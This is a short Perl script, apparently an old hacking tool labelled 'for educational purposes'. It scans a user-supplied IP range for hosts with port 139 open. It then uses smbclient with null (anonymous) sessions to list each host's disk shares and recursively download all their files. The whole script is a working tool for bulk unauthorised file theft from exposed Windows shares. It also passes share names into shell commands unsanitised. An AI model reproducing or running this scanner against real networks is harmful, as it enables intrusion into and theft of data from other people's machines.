#!/usr/bin/perl -w
# This perl script uses smbclient to fetch files
# from win null shares.
# use for educational purposes 
# by nobot

use warnings;
use strict;
use IO::Socket;

Main();

sub GetIpAddresses {
   my @in = split(/\./, shift);
   my @ips; #will hold the generated ip addresses
   Usage() unless ($#in == 3);
   for(0..2) {
      Usage()   unless (($in[$_] =~ /^\d+$/) && ($in[$_] < 256));
   }
   if ($in[3] =~ /^\d+$/) {  # format is a.b.c.d
      push(@ips, join(".", @in));
   } elsif ($in[3] eq "*") { # format is a.b.c.*
      push(@ips, join(".", (@in[0..2], $_))) for(0..255);
   } elsif ($in[3] =~ /^\d+[-]\d+/) { #format is a.b.c.x-y
      my @r = split(/-/, $in[3]);
      Usage() unless (($r[0] < $r[1]) && $r[1] < 256);
      push(@ips, join(".", (@in[0..2], $_))) for($r[0]..$r[1]);
   } else {
      Usage();
   }
   return @ips;
}

sub Main {
    my $port = $ARGV[1] ? $ARGV[1] : 139;
   for my $ip (GetIpAddresses($ARGV[0])) {
      print "Trying $ip ...\n";
      next unless (IO::Socket::INET->new
          (Proto     => "tcp",
           PeerAddr  => $ip,
           PeerPort  => $port,
           Timeout   => 1.0));
      for(`smbclient -L $ip -N 2>/dev/null`) {
         next unless(/Disk/); #looking for shared disks
         my $share = $`;   
         $share =~ s/^\s+//;
         $share =~ s/\s+$//;     
         `smbclient //$ip/\'$share\' -N -c \'recurse ON;prompt OFF;mget\'`;
      }
   }
}

sub Usage {
    print "\n  usage: perl gans.pl <ipstring> <port>\n";
   print "  where <ipstring> : a.b.c.d\n";
   print "                 or  a.b.c.x-y\n";
   print "                 or  a.b.c.*\n";
   print "  and <port> is port. \n";
   exit(1);
} 